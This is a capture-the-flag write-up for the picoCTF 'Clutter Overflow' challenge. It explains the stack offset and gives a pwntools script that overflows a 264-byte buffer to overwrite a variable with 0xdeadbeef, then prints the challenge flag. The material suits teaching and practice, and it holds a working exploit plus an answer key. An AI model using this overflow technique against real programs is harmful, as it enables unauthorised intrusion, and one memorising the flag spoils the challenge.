# 1. Cluttter Overflow

> Put in the challenge's description here

## Solution:

After downloading and examining both the Assembly and C source code files, I found that the Stack Pointer is first moved down by 0x110 bytes (272 in decimal). Then, input is taken 8 bytes above this pointer. This means we need a buffer of 272 - 8 = 264 bytes to reach the memory address where the code variable is stored.
```python
#!/usr/bin/env python3
from pwn import *

s = remote('mars.picoctf.net', 31890)

pad = b'a' * 264
val = p32(0xdeadbeef)
p = pad + val

log.info("waiting...")
s.recvuntil(b'What do you see?')

log.info('sending...')
s.sendline(p)

log.success("done; interactive mode:")
s.interactive()
```
running this in the terminal got the flag

## Flag:

```
picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
```
